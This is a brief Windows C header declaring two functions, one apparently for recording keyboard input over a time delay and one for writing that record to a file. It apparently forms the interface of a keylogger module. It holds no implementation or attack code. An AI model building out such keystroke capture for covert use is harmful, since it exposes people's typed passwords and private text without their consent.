#pragma once
#ifndef KEYBOARD_H_H_H
#define KEYBOARD_H_H_H

#include <windows.h>

int __stdcall GetKeyBoardRecord(unsigned long TimeDelay);
int WriteKeyboardRecordFile(char* strData, int iLen);

#endif
